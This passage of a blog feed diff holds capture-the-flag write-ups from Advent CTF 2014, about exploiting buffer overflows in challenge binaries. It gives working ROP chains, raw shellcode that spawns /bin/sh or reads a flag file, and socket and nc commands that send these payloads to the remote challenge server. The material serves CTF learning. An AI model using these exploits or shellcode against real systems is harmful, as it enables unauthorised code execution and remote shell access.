+<p>First, I use a <code>pop esi; ret</code> gadget to set the value of <code>esi</code> to a 48 bit value that contains: 0x3, 0x0. Then I return to the little gadget to set <code>eax</code> (and <code>es</code>) using those values. This results in <code>eax</code> being the correct number for the next syscall, read:</p>
+
+<pre><code class="python">payload += p(SYSCALL)
+payload += p(ADDESP)    # fix stack
+payload += p(0)         # stdin
+payload += p(0x8048000) # address of buffer
+payload += p(0x200)     # number of bytes to read
+payload += "BBBB"       # dummy value
+
+payload += p(0x8048000)
+</code></pre>
+
+<p>This reads in <code>0x200</code> bytes from stdin to the start of the executable section of the binary. Finally, the ROP chain returns to the start of that buffer, which hopefully contains our shellcode! Finally, make sure that the payload is indeed 125 bytes long, else this entire house of cards falls down:</p>
+
+<pre><code class="python"># payload length must be 125, because after read, the next
+# syscall is mprotect; eax = 125
+payload += "A"*(125-len(payload))
+</code></pre>
+
+<p>Because I ran the executable locally via socat, I need to connect to the proper socket and send the payload. The same goes for the remote connection.</p>
+
+<pre><code class="python">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#s.connect(("localhost",28099))
+s.connect(("pwnable.katsudon.org",28099))
+
+s.send(payload)
+</code></pre>
+
+<p>After finishing the ROP chain, the binary should now be awaiting further shellcode on stdin, so I&rsquo;d better send that over quickly!</p>
+
+<pre><code class="python"># http://www.shell-storm.org/shellcode/files/shellcode-851.php
+s.send("\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68")
+
+# the shell should have been spawned, so interact with it
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+</code></pre>
+
+<p>The shellcode is sent over; the ROP chain will read it at <code>0x8048000</code>, return to it and execute <code>/bin/sh</code>. Then I pass the socket to a telnet client to interact with the spawned shell. This allowed me to read the flag!</p>
+
+<pre><code class="bash">bas@tritonal:~/adventctf$ python exploit_easy.py 
+pwn me:
+id
+uid=1000(easypwn) gid=1000(easypwn) groups=1000(easypwn)
+cat /home/easypwn/flag
+ADCTF_175_345y_7o_cON7ROL_5Y5c4LL
+</code></pre>
+
+<p>The flag was <code>ADCTF_175_345y_7o_cON7ROL_5Y5c4LL</code>.</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Advent CTF 2014 - Oh My Scanf]]></title>
+    <link href="http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf/"/>
+    <updated>2014-12-17T22:22:34+01:00</updated>
+    <id>http://barrebas.github.io/blog/2014/12/17/adctf-2014-oh-my-scanf</id>
+    <content type="html"><![CDATA[<p>Another month, another CTF! This Advent CTF runs almost the entire month of December. This challenge seemed easy at first, but turned out to be a bit more tricky!</p>
+
+<!-- more -->
+
+
+<p>We&rsquo;re given a vulnerable binary plus the C source:</p>
+
+<pre><code class="c">/* gcc -m32 -fno-stack-protector -zexecstack -o oh_my_scanf oh_my_scanf.c */
+#include &lt;stdio.h&gt;
+
+int main(void) {
+    char name[16];
+
+    setvbuf(stdout, NULL, _IONBF, 0);
+    printf("name: ");
+    scanf("%s", name);
+    printf("hi, %s\n", name);
+
+    return 0;
+}
+</code></pre>
+
+<p>This looks pretty straight-forward, right? <code>scanf</code>, an executable stack and a small buffer, oh my! A standard buffer overflow:</p>
+
+<pre><code class="bash">bas@tritonal:~/adventctf$ ulimit -c unlimited
+bas@tritonal:~/adventctf$ ./oh_my_scanf 
+name: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
+hi, AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK
+Segmentation fault (core dumped)
+</code></pre>
+
+<p>I checked <code>gdb</code> and <code>eip</code> was overwritten with <code>HHHH</code>, so we need 28 bytes to overflow the buffer. Next, because the stack is executable, we should be able to jump to it&hellip; but how? ALSR is enabled so we don&rsquo;t know the location of the stack. None of the registers contain a pointer to the shellcode, there aren&rsquo;t any <code>jmp esp</code> or <code>call esp</code> instructions. Bruteforcing it seemed tedious at best. We looked at writing a ROP chain, but there are very few useable gadgets.</p>
+
+<p>Thinking long and hard together with Swappage and superkojiman, we came up with several strategies. One of the suggestions by Swappage revolved around abusing <code>scanf</code> to build shellcode somewhere. superkojiman noticed that the main code section is <code>rwx</code>!</p>
+
+<pre><code>gdb-peda$ vmmap
+Start      End        Perm  Name
+0x08048000 0x08049000 r-xp  /home/bas/adventctf/oh_my_scanf
+0x08049000 0x0804a000 r-xp  /home/bas/adventctf/oh_my_scanf
+0x0804a000 0x0804b000 rwxp  /home/bas/adventctf/oh_my_scanf
+0xf7e19000 0xf7e1a000 rwxp  mapped
+...snip...
+</code></pre>
+
+<p>Yes, this has to be it! We can write to a section of memory that is executable <em>and</em> at a fixed location. After writing shellcode there, we simply jump to it to have our cake <em>and</em> eat it.</p>
+
+<p>So I modified a ROP chain that I was fiddling with:</p>
+
+<pre><code class="python">#!/usr/bin/python
+import struct
+
+def p(x):
+  return struct.pack("&lt;L", x)
+
+SCANF = 0x80483b0a
+POPRET = 0x804835d
+SCANF_STRING = 0x80495ce
+
+payload = ""
+payload += "A"*28
+
+payload += p(SCANF)         # return-to-got, scanf
+payload += p(POPRET)        # next return address
+payload += p(SCANF_STRING)  # pointer to "%s", arg1 for scanf
+payload += p(0x0804a040)    # pointer to readable/executable
+                            # arbitrarily chosen section of code
+                            # it doubles as return address
+payload += "\n"             # close first scanf call
+
+# this modified shellcode below will be read by the scanf call that results from our ROP chain.
+# we need the extra "\na" to flush the buffer, i think. 
+payload += "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x54\x59\x90\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xffflag\na"
+
+print payload
+</code></pre>
+
+<p>I used a modified version of <a href="http://www.shell-storm.org/shellcode/files/shellcode-73.php">this shellcode</a>. The shellcode wasn&rsquo;t working locally, and I narrowed it down quickly to a bad byte, <code>0x0c</code>. This was part of the <code>lea ecx, [esp]</code> instruction. I exchanged this for:</p>
+
+<pre><code class="bash">bas@tritonal:~/adventctf$ rasm2 - 
+push esp
+54
+pop ecx
+59
+nop
+90
+</code></pre>
+
+<p>And off we went! I verified the exploit remotely by reading <code>/etc/passwd</code> and then I guessed the name of the flag file to be <code>flag</code>. Simple, really =)</p>
+
+<pre><code class="bash">bas@tritonal:~/adventctf$ python exploit.py | nc pwnable.katsudon.org 32100
+name: hi, AAAAAAAAAAAAAAAAAAAAAAAAAAAA..].E.@..
+ADCTF_Sc4NF_IS_PRe77Y_niCE
+</code></pre>
+
+<p>The flag was <code>ADCTF_Sc4NF_IS_PRe77Y_niCE</code>. In the end, the executable stack turned out to be a red herring and something more unusual was going on. Cool challenge!</p>
 ]]></content>
   </entry>
   
